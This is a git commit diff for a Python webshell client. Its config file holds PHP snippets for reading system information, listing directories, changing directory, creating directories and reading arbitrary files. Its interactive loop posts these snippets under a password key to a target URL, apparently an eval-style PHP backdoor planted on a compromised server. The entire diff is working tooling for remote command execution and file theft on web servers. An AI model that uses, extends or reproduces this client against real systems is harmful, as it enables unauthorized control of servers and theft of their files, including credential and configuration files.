2d434714b7d7e9e7a1f8dfc49be520926cf3fd61
chenguang552 <chenguang552@hotmail.com>
2019-02-19 22:20:19 +0800

    201902192220

--- config/fileConfig.py
+++ config/fileConfig.py
@@ -1,7 +1,12 @@
-PHP_fileBaseCode='''echo php_uname('s');mkdir("test/");'''
-fileConfig = {
-        'cd',''
-        'read',''
-        'write',''
-        'delete',''
-        }
+PHP_fileBaseCode='''echo "\n目标主机系统:";echo php_uname('s');'''
+PHP_GETDIR = '''$handle=opendir('.');\
+        echo "\n目录:----------------------\n";\
+        while($file = readdir($handle)){echo "$file\n";}closedir($handle);'''
+PHP_GETPATH = '''echo getcwd();'''
+PHP_MKDIR = '''mkdir("##/");'''
+PHP_CD = '''chdir("##/");'''
+
+PHP_READ = '''$ff=fopen("##","r");if(!$ff){echo "<br />加载失败 或无此文件<br />";\
+        exit;}while(!feof($ff)){echo fgets($ff,256);}fclose($ff);'''
+PHP_test = '''$ff=fopen("newfile.txt","r");echo fgets($ff,1024);'''
+
--- util/fileManager.py
+++ util/fileManager.py
@@ -1,21 +1,86 @@
 import config.fileConfig as fileC
-import requests as re
+import requests as res
 class fileManager:
+
     def __init__(self,con):
         self.con = con
 
     def Begin(self):
         #connect = 'http://127.0.0.1:8080/index.php'
-        connect = self.con.getUrl()
+        self.connect = self.con.getUrl()
+        self.key = self.con.getKey()
         #connect = connect + self.getBaseCode()
         #print(connect)
-        date = {'key':self.getBaseCode()}
-        firstURL=re.post(connect,date)
+        date = { self.key : self.getBaseCode() }
+        re = res.session()
+        firstURL=re.post(self.connect,date)
         #print(firstURL.text)
         print(firstURL.text)
+        self.FileMain(re)
+        re.close()
+
 
 
     def getBaseCode(self):
         baseCodeForFile=fileC.PHP_fileBaseCode
         #print(baseCodeForFile)
         return baseCodeForFile
+
+    def check(self,text):
+        if len(text)<2:
+            print('缺少参数')
+        return len(text)
+
+    def path(self,re):
+        getpath = fileC.PHP_GETPATH
+        date = { self.key : getpath }
+        commit = re.post(self.connect,date)
+        # print(commit.text)
+        return commit.text
+
+    def FileMain(self,re):
+        while True:
+            self.PATH = self.path(re)+" >"
+            # print(PATH)
+            flag = input(self.PATH).split()
+
+            if flag[0] == 'exit':
+                print('exit')
+                flag == ''
+                break
+                
+            if flag[0] == 'cd':
+                if self.check(flag)>1:
+                    chdir = fileC.PHP_CD.replace('##',flag[1],1)
+                    print(chdir)
+                    date = { self.key : chdir }
+                    commit = re.post(self.connect,date)
+                else:
+                    continue
+                
+            if flag[0] == 'read':
+                if self.check(flag)>1:
+                    READ_r = fileC.PHP_READ.replace('##',flag[1],1)
+                    # print(READ_r)
+                    date = { self.key : READ_r }
+                    #date = { self.key : fileC.PHP_test }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'ls' or flag[0] == 'dir':
+                dir = fileC.PHP_GETDIR
+                date = { self.key : dir }
+                commit = re.post(self.connect,date)
+                print(commit.text,"\n")
+
+            if flag[0] == 'pwd' or flag[0] == 'cwd':
+                pwd = fileC.PHP_GETPATH
+                date = { self.key : pwd }
+                commit = re.post(self.connect,date)
+                print(commit.text,"\n")
+                
+                
+
+
